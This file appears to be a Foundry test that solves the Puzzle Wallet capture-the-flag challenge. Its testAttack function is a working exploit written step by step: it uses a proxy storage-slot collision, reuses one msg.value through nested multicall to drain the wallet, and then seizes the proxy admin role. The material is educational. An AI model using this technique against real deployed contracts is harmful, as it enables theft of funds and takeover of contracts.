// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/challenge-24-puzzle-wallet/PuzzleProxy.sol";

contract PuzzleProxyTest is Test {
    PuzzleProxy public proxy;
    PuzzleWallet public implementation;
    PuzzleWallet public wallet;

    address public admin = address(0x725595BA16E76ED1F6cC1e1b65A88365cC494824);
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(admin, 10 ether);
        vm.deal(player, 10 ether);

        // Deploy the logic contract
        implementation = new PuzzleWallet();

        // Initialize the proxy through delegatecall.
        // Because of the storage collision, slot 1 is later overwritten by `admin`,
        // so `maxBalance()` will read back as uint256(uint160(admin)).
        bytes memory initData = abi.encodeCall(PuzzleWallet.init, (uint256(uint160(admin))));

        // Deploy the proxy pointing to the implementation
        vm.prank(admin);
        proxy = new PuzzleProxy(admin, address(implementation), initData);

        // Interact with the proxy using the PuzzleWallet ABI
        wallet = PuzzleWallet(address(proxy));

        // Whitelist the admin so the admin can deposit ETH into the wallet
        vm.prank(admin);
        wallet.addToWhitelist(admin);

        // Fund the proxy so the initial state matches the Sepolia instance
        vm.prank(admin);
        wallet.deposit{value: 0.001 ether}();

        vm.label(admin, "Admin");
        vm.label(player, "Player");
        vm.label(address(proxy), "PuzzleProxy");
        vm.label(address(implementation), "PuzzleWalletImpl");
    }

    function testInitialState() public view {
        // `admin` in the proxy and `maxBalance` in the wallet share slot 1
        assertEq(proxy.admin(), admin);
        assertEq(wallet.maxBalance(), uint256(uint160(admin)));

        // Admin is initially whitelisted and the proxy starts funded
        assertTrue(wallet.whitelisted(admin));
        assertEq(address(proxy).balance, 0.001 ether);
    }

    function testAttack() public {
        // Step 1:
        // Call `proposeNewAdmin(player)` on the proxy.
        //
        // `pendingAdmin` lives in slot 0 of the proxy.
        // `owner` lives in slot 0 of the wallet implementation.
        //
        // Because wallet logic runs against proxy storage, setting `pendingAdmin`
        // changes what `owner()` returns.
        vm.prank(player);
        proxy.proposeNewAdmin(player);

        assertEq(proxy.pendingAdmin(), player);
        assertEq(wallet.owner(), player);

        // Step 2:
        // Since the player is now effectively the wallet owner,
        // they can whitelist themself.
        vm.prank(player);
        wallet.addToWhitelist(player);

        assertTrue(wallet.whitelisted(player));

        // Step 3:
        // Build a nested multicall payload to reuse the same msg.value twice.
        //
        // Outer multicall:
        //   1. deposit()
        //   2. multicall([deposit()])
        //   3. execute(player, 0.002 ether, "")
        //
        // The nested multicall resets the local `depositCalled` flag,
        // so the same 0.001 ether is credited twice.
        bytes memory depositCalldata = abi.encodeCall(PuzzleWallet.deposit, ());

        bytes[] memory innerMultiCalldata = new bytes[](1);
        innerMultiCalldata[0] = depositCalldata;

        bytes[] memory outerMulticallData = new bytes[](3);
        outerMulticallData[0] = depositCalldata;
        outerMulticallData[1] = abi.encodeCall(PuzzleWallet.multicall, (innerMultiCalldata));
        outerMulticallData[2] = abi.encodeCall(PuzzleWallet.execute, (player, 0.002 ether, bytes("")));

        vm.startPrank(player);
        wallet.multicall{value: 0.001 ether}(outerMulticallData);
        vm.stopPrank();

        // The wallet balance is now drained to zero
        assertEq(address(proxy).balance, 0);
        assertEq(wallet.balances(player), 0);

        // Step 4:
        // Once the wallet balance is zero, we can call setMaxBalance.
        //
        // `maxBalance` in the wallet shares slot 1 with `admin` in the proxy,
        // so writing the player's address here overwrites the proxy admin.
        vm.prank(player);
        wallet.setMaxBalance(uint256(uint160(player)));

        assertEq(proxy.admin(), player);
    }
}
